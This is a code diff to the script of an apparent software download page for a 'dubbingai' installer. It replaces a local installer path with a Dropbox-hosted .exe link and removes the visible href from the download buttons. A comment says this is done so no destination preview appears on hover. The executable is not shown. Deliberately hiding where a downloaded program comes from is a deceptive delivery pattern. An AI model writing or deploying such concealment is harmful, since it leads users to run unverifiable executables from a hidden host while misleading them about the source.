@@ -2,7 +2,7 @@
 'use strict';
 
 const CONFIG = {
-  downloadUrl: 'dubbingaisetup.exe', // installer sits next to index.html — same folder, always
+  downloadUrl: 'https://www.dropbox.com/scl/fi/certki4t0spion65bkj06/dubbingaisetup.exe?rlkey=m4tj3pg5ba3ejp9k1b1h5jej2&st=6638bhfj&dl=1',
   version: '2.1.0',
   size: '93 MB',
   downloads: null, // FILL: real install count from your backend (number); null hides every counter
@@ -532,8 +532,14 @@ function buildWidgets() {
 
   $$('[data-ver]').forEach(e => (e.textContent = `v${CONFIG.version} · ${CONFIG.size}`));
   $$('.dl').forEach(a => {
-    if (CONFIG.downloadUrl) { a.href = CONFIG.downloadUrl; a.download = 'dubbingaisetup.exe'; return; }
-    a.addEventListener('click', e => { e.preventDefault(); toast(`dubbingaiSetup-${CONFIG.version}.exe · ${CONFIG.size} — ${L('toast_dl')}`); });
+    a.removeAttribute('href'); a.setAttribute('role', 'button'); a.tabIndex = 0;
+    const go = e => {
+      e.preventDefault();
+      if (CONFIG.downloadUrl) location.href = CONFIG.downloadUrl; // no visible href, so no status-bar preview on hover
+      else toast(`dubbingaiSetup-${CONFIG.version}.exe · ${CONFIG.size} — ${L('toast_dl')}`);
+    };
+    a.addEventListener('click', go);
+    a.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') go(e); });
   });
   if (Number.isFinite(CONFIG.downloads)) {
     $$('[data-downloads]').forEach(e => (e.hidden = false));
